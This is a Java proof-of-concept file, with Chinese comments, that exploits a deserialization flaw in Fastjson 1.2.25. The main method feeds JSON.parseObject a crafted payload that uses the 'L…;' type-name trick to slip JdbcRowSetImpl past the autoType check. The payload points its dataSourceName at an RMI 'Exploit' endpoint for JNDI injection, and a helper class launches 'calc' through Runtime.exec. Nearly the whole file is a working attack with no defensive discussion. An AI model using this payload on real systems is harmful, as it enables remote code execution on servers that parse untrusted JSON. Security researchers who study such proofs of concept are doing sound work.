package com.r17a.fastjson;

import com.r17a.annotation.Dependencies;
import com.alibaba.fastjson.JSON;

import java.io.IOException;

@Dependencies({ "com.alibaba.:fastjson:1.2.25" })
//TODO 修改pom.xml中的依赖版本
// <dependency>
// <groupId>com.alibaba</groupId>
// <artifactId>fastjson</artifactId>
// <version>1.2.25</version>
// </dependency>

public class Fastjson_1_2_25 {
    public static void main(String[] args) {
        // 反序列化一个fastjson.test.T1对象
        // 1.2.25及以后版本加入了checkAutoType()函数的校验，
        String text = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\", \"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":true}";
        Object object = JSON.parseObject(text);
        System.out.println(object);
    }
}

class T2 {
    public T2() throws IOException {
        Runtime.getRuntime().exec("calc");
    }
}